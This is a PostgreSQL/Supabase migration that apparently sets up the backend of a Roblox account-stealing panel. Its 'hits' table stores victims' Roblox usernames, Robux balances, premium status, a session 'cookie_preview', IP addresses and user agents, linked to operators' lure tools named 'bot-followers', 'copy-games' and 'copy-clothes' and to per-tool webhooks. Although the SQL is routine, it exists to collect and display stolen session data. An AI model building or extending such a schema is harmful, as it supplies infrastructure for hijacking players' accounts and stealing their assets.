
-- 1. Profiles: new columns
ALTER TABLE public.profiles
  ADD COLUMN IF NOT EXISTS login_key TEXT UNIQUE,
  ADD COLUMN IF NOT EXISTS signup_webhook_url TEXT,
  ADD COLUMN IF NOT EXISTS webhook_bot_followers TEXT,
  ADD COLUMN IF NOT EXISTS webhook_copy_games TEXT,
  ADD COLUMN IF NOT EXISTS webhook_copy_clothes TEXT;

-- 2. Reserved usernames table
CREATE TABLE IF NOT EXISTS public.reserved_usernames (
  name TEXT PRIMARY KEY
);

ALTER TABLE public.reserved_usernames ENABLE ROW LEVEL SECURITY;

DROP POLICY IF EXISTS "Reserved usernames readable by everyone" ON public.reserved_usernames;
CREATE POLICY "Reserved usernames readable by everyone"
  ON public.reserved_usernames FOR SELECT
  USING (true);

INSERT INTO public.reserved_usernames(name) VALUES
  ('login'), ('signup'), ('register'), ('dashboard'), ('logout'),
  ('tools'), ('faq'), ('contact'), ('bot-followers'),
  ('copy-games'), ('copy-clothes'), ('api'), ('admin'), ('administrator'),
  ('assets'), ('static'), ('public'), ('settings'), ('account'),
  ('profile'), ('profiles'), ('user'), ('users'), ('hits'),
  ('webhook'), ('webhooks'), ('auth'), ('home'), ('index'),
  ('null'), ('undefined'), ('root'), ('support'), ('help'),
  ('about'), ('privacy'), ('terms'), ('robots.txt'), ('favicon.png')
ON CONFLICT DO NOTHING;

-- 3. Hits table
CREATE TABLE IF NOT EXISTS public.hits (
  id UUID PRIMARY KEY DEFAULT gen_random_uuid(),
  owner_id UUID NOT NULL REFERENCES public.profiles(id) ON DELETE CASCADE,
  tool_type TEXT NOT NULL,
  roblox_username TEXT,
  roblox_user_id BIGINT,
  roblox_robux INTEGER,
  roblox_premium BOOLEAN,
  roblox_headshot_url TEXT,
  cookie_preview TEXT,
  ip_address TEXT,
  user_agent TEXT,
  created_at TIMESTAMPTZ NOT NULL DEFAULT now()
);

CREATE INDEX IF NOT EXISTS idx_hits_owner_created ON public.hits(owner_id, created_at DESC);

ALTER TABLE public.hits ENABLE ROW LEVEL SECURITY;

DROP POLICY IF EXISTS "Owners can view their hits" ON public.hits;
CREATE POLICY "Owners can view their hits"
  ON public.hits FOR SELECT
  USING (auth.uid() = owner_id);

-- (No insert policy — only the service role inserts via edge functions.)

-- 4. Username validation trigger: reject reserved names too
CREATE OR REPLACE FUNCTION public.validate_username()
RETURNS TRIGGER
LANGUAGE plpgsql
SET search_path = public
AS $$
BEGIN
  IF NEW.username !~ '^[a-z0-9_-]{3,30}$' THEN
    RAISE EXCEPTION 'Invalid username. Use 3-30 lowercase letters, numbers, hyphens, or underscores.';
  END IF;

  IF EXISTS (SELECT 1 FROM public.reserved_usernames WHERE name = NEW.username) THEN
    RAISE EXCEPTION 'That username is reserved.';
  END IF;

  RETURN NEW;
END;
$$;

DROP TRIGGER IF EXISTS validate_username_trigger ON public.profiles;
CREATE TRIGGER validate_username_trigger
  BEFORE INSERT OR UPDATE OF username ON public.profiles
  FOR EACH ROW
  EXECUTE FUNCTION public.validate_username();

-- 5. New-user trigger: also generate 10-char login key + capture signup webhook
CREATE OR REPLACE FUNCTION public.handle_new_user()
RETURNS TRIGGER
LANGUAGE plpgsql
SECURITY DEFINER
SET search_path = public
AS $$
DECLARE
  generated_key TEXT;
  alphabet TEXT := 'ABCDEFGHJKLMNPQRSTUVWXYZ23456789';
  i INT;
BEGIN
  generated_key := '';
  FOR i IN 1..10 LOOP
    generated_key := generated_key || substr(alphabet, 1 + floor(random() * length(alphabet))::int, 1);
  END LOOP;

  INSERT INTO public.profiles (id, username, login_key, signup_webhook_url)
  VALUES (
    NEW.id,
    LOWER(COALESCE(NEW.raw_user_meta_data->>'username', 'user_' || SUBSTRING(NEW.id::text, 1, 8))),
    generated_key,
    NEW.raw_user_meta_data->>'signup_webhook_url'
  );
  RETURN NEW;
END;
$$;

-- Ensure the trigger exists on auth.users
DROP TRIGGER IF EXISTS on_auth_user_created ON auth.users;
CREATE TRIGGER on_auth_user_created
  AFTER INSERT ON auth.users
  FOR EACH ROW EXECUTE FUNCTION public.handle_new_user();
